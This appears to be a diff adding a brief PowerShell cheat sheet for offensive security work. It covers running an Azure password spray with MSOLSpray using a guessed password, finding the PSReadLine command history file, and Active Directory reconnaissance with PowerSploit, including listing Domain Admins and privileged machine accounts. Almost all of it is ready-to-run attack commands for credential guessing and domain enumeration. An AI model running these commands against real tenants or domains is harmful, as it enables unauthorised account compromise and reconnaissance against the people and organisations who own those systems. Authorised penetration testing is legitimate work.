@@ -1,0 +1,20 @@
+####PowerShell Tips and Tricks
+
+List all services that do not run as a standard account----Get-ItemProperty -Path Registry::HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\* | Where-Object {($_.ObjectName -notlike 'NT Authority\*') -and ($_.ObjectName -ne $null) -and ($_.ObjectName -ne "LocalSystem")}
+
+Create a PSCredential----$username="foo";$pass = ConvertTo-SecureString "bar" -AsPlainText -Force; New-Object -TypeName PSCredential -ArgumentList $username,$pass
+
+Import a Module----Import-Module .\MSOLSpray.ps1; 
+Azure Password Spray----Invoke-MSOLSpray -Userlist ./users.txt -Password "Spring2020"
+
+PowerShell Command History File----% AppData Roaming Microsoft Windows PowerShell PSReadLine ConsoleHost_history.txt
+
+##PowerSploit
+Enumerate User----Get-NetUser <user>
+Enumerate Group----Get-NetGroup <group>
+Get Groups for which User is member----Get-NetGroup -Username <user>
+Group Members----Get-NetGroupMember <group>
+Get all effective member of group----Get-NetGroupMember -GroupName <group> -Recurse
+Search the forest global catalog----Get-NetUser -UserName <user> -ADSpath "GC: //domain.com"
+Find Privileged Machine Accounts----Get-NetGroup -AdminCount | Get-NetGroupMember -Recurse | ?{$_.MemberName -like '*$'}
+Find Domain Admins and Users with same first/last name----Get-NetGroupMember -GroupName "Domain Admins" -FullData | %{ $a=$_.displayname.split(" ")[0..1] -join " "; Get-NetUser -Filter "(displayname=*$a*)"} | Select-Object -Property displayname,samaccountname
